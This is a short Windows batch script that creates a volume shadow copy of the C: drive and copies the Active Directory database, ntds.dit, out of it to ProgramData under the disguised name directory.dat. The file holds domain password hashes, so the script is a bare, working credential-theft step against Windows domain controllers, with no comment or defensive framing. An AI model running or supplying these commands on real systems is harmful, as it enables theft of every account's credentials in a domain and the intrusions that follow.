@echo off
vssadmin.exe create shadow /for=C:
copy /y "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12\Windows\NTDS\ntds.dit" "C:\ProgramData\directory.dat"
